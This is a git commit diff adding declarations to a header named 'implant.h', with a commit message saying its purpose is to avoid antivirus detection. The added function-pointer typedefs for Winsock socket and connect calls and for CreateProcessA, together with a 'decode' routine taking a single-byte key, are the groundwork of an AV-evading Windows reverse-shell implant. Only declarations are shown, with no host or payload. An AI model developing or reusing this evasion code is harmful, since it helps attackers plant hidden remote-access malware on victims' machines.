75a3e1b0086686ecfdce3180c6c0006e6190583c
Bastien FAUGIER <133578470+korakino@users.noreply.github.com>
2026-05-10 19:24:58 +0000

    Create custom function to not be detected by an AV

--- implant.h
+++ implant.h
@@ -6,4 +6,36 @@
 #define DEFAULT_BUFLEN 1024
 
 
+
+
+
+// Signature for WSAStartup
+typedef int (WSAAPI *pWSAStartup)(
+    WORD wVersionRequired, 
+    LPWSADATA lpWSAData
+);
+
+
+// Signature for WSASocketA
+typedef SOCKET (WSAAPI *pWSASocketA)(
+    int af, 
+    int type, 
+    int protocol, 
+    LPWSAPROTOCOL_INFOA lpProtocolInfo, 
+    GROUP g, 
+    DWORD dwFlags
+);
+
+// Signature for connect
+typedef int (WSAAPI *pConnect)(
+    SOCKET s, 
+    const struct sockaddr *name, 
+    int namelen
+);
+typedef BOOL (WINAPI *pCreateProcessA)(
+    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, 
+    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION
+);
+
 char* decode(char* message, char key, int lenght);
+
